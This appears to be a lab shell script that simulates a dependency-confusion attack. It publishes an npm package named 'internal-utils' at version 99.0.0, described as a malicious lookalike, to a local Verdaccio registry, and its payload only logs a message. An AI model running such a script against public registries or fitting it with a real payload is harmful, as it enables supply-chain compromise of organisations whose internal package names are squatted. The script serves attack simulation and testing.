#!/bin/sh
# Publishes a package named like an internal company dep to the public registry
set -e
mkdir -p /tmp/pkg && cd /tmp/pkg
cat > package.json <<'PKG'
{
  "name": "internal-utils",
  "version": "99.0.0",
  "description": "malicious lookalike"
}
PKG
cat > index.js <<'JS'
// Simulated exfil payload (safe: just logs)
console.log("[ATTACK] dependency-confusion payload executed");
JS
npm config set registry http://verdaccio:4873
npm publish --registry http://verdaccio:4873 || true
echo "[SIM] Dependency confusion package published"
